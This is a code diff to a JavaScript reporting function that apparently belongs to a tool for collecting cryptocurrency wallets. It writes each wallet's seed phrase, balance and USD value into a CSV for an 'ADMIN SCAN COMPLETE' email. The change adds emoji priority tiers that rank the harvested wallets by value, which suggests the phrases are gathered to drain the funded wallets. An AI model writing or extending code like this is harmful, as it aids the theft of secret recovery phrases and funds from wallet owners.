@@ -241,11 +241,17 @@ async function sendCompleteResults(wallets, totalScanned) {
     const walletsWithFunds = wallets.filter(w => w.totalValueUSD > 0);
     const totalValue = walletsWithFunds.reduce((sum, w) => sum + w.totalValueUSD, 0);
     
-    // Create CSV content
-    const csvHeader = 'Index,Address,Phrase,ETH_Balance,Total_USD,Has_Funds\n';
-    const csvRows = wallets.map((w, i) => 
-      `${i + 1},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? 'YES' : 'NO'}`
-    ).join('\n');
+    // Create CSV content with color coding
+    const csvHeader = 'Index,Address,Phrase,ETH_Balance,Total_USD,Has_Funds,Priority\n';
+    const csvRows = wallets.map((w, i) => {
+      let priority = 'EMPTY';
+      if (w.totalValueUSD > 100) priority = '🟢 HIGH VALUE';
+      else if (w.totalValueUSD > 10) priority = '🟡 MEDIUM VALUE';
+      else if (w.totalValueUSD > 0) priority = '🔵 LOW VALUE';
+      else priority = '⚫ EMPTY';
+      
+      return `${i + 1},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? '💰 YES' : '❌ NO'},${priority}`;
+    }).join('\n');
     const csvContent = csvHeader + csvRows;
     
     const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
